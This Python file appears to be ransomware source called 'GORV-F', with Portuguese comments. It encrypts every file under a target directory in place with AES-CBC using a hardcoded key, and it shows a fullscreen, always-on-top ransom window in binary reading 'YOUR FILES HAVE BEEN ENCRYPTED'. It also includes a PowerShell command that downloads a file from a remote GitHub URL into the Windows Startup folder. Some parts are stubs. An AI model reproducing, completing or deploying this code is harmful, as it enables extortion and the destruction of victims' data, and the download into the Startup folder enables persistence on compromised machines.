import os
from tkinter import *
import subprocess
from PIL import Image, ImageTk
from commands import *
from Crypto.Random import get_random_bytes # generate random key
from Crypto.Protocol.KDF import PBKDF2 # brute-force protection
from Crypto.Cipher import AES #  cryption
from Crypto.Util.Padding import pad, unpad #



def prevent_closing():
    pass



def on_close():
    pass



def second_screen():
    UnderCarpet = Tk()
    UnderCarpet.title("GORV-F")
    UnderCarpet.geometry('1080x720')
    UnderCarpet.configure(bg='black')
    UnderCarpet.attributes('-topmost', True)



def screen(self):

    #GORV-F#
    GORVFscreen = Tk()
    GORVFscreen.title("GORV-F")
    GORVFscreen.attributes('-topmost', True)
    GORVFscreen.focus_force()
    GORVFscreen.configure(bg='black')
    GORVFscreen.resizable(False, False)
    GORVFscreen.geometry('1920x1080')
    GORVFscreen.overrideredirect(True)
    #GORVFscreen.protocol("WM_DELETE_WINDOW", prevent_closing)
    #GORVFscreen.protocol("WM_DELETE_WINDOW", on_close)
    Binarios = Button(GORVFscreen, text = '01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n01011001 01001111 01010101 01010010 00100000 01000110 01001001 01001100 01000101 01010011 00100000 01001000 01000001 01010110 01000101 00100000 01000010 01000101 01000101 01001110 00100000 01000101 01001110 01000011 01010010 01011001 01010000 01010100 01000101 01000100\n', font=('calibri', 12), fg = 'red', bg = 'black', command=(second_screen),  relief=FLAT)
    Binarios.grid(column=2, row=2)
    GORVFscreen.mainloop()
    #GORV-F#




# gera chave da AES
# key = get_random_bytes(32)
# print (key) ↓
key = b'\tL\xc2\xfdI\x08\xe6\xd4\xedd\xdcWe\xcfJ\xf1\xae\x15J\x81\xe6\x1fq\xab?\xf8\xf8\xd0\xa7\x8e"s'
# Specify the directory to encrypt/decrypt
directory = 'Nova pasta'



# Encrypt
def pad(data):
    padding_length = AES.block_size - len(data) % AES.block_size
    return data + bytes([padding_length]) * padding_length
def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv

    with open(file_path, 'rb') as f:
        plaintext = f.read()
    
    padded_plaintext = pad(plaintext)
    ciphertext = cipher.encrypt(padded_plaintext)

    with open(file_path, 'wb') as f:
        f.write(iv)
        f.write(ciphertext)
def encrypt_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)



# Decrypt
def unpad(data):
    padding_length = data[-1]
    return data[:-padding_length]
def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        iv = f.read(AES.block_size)
        ciphertext = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(ciphertext)
    unpadded_data = unpad(decrypted_data)

    with open(file_path, 'wb') as f:
        f.write(unpadded_data)
def decrypt_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)



def powershell(self):
    # Comando do PowerShell que você deseja executar
    comando = 'cd "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/cosmosredshiftsete/State-Diagram-in-PY/main/img/Diagram%201.png" -OutFile "arquivo.png"'

    # Executa o comando no PowerShell e captura a saída
    saida = subprocess.run(['powershell', '-Command', comando], capture_output=True, text=True)